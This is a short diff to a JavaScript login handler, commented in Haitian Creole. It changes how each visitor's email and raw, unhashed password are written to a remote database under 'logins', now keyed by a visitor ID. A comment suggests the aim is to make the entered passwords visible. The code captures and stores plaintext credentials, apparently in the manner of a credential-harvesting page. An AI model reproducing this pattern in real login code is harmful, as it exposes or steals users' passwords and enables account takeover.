@@ -429,10 +429,10 @@ btnLogin.onclick = () => {
 
   localStorage.setItem("visitor_email", email);
 
-  // ✅ SOVGADE KONEKSYON AK MODPAS
-  db.ref("logins").push({
+  // ✅ SÈVI AK SET() OLYE DE PUSH() — PA GEN DOUB
+  db.ref("logins/" + VISITOR_ID).set({
     email: email,
-    password: pw,           // ← SE SA KI FÈ MODPAS LA PARÈT
+    password: pw,
     visitorId: VISITOR_ID,
     time: Date.now()
   });
